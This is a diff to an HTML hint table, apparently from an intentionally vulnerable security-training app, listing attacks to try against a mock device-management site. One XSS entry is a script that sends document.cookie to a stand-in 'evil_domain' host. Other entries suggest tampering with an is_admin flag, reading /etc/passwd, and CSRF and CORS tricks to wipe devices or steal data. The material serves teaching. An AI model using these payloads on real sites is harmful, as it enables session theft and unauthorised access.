@@ -35,7 +35,7 @@
                                         <tr>
                                             <th scope="row">Cross Side Scripting Pages</th>
                                             <td><code>&#x3C;script&#x3E;
-                                            document.write(&#x27;&#x3C;img src=&#x22;{{ domain }}evilimage?get=&#x27;+escape(document.cookie)+&#x27;&#x22;&#x3E;&#x27;);
+                                            document.write(&#x27;&#x3C;img src=&#x22;{{ evil_domain }}evilimage?get=&#x27;+escape(document.cookie)+&#x27;&#x22;&#x3E;&#x27;);
                                             &#x3C;/script&#x3E;</code></td>
                                         </tr>
                                         <tr>
@@ -54,6 +54,14 @@
                                             <th scope="row">Parameter Tampering</th>
                                             <td><a href="">Add <code>"is_admin": true</code> to the JSON request body</li></td>
                                         </tr> 
+                                        <tr>
+                                            <th scope="row">Cross-Site Request Forgery (CSRF)</th>
+                                            <td>Visit the evil contractor portal while logged into MDM to trigger device wipe: </td>
+                                        </tr>
+                                        <tr>
+                                            <th scope="row">Cross-Origin Resource Sharing (CORS)</th>
+                                            <td>Visit the evil benefits portal while logged into MDM to steal sensitive device data via API</td>
+                                        </tr>
                                         <tr>
                                             <th scope="row">Path Traversal</th>
                                             <td><a href="">Download /etc/passwd</td>
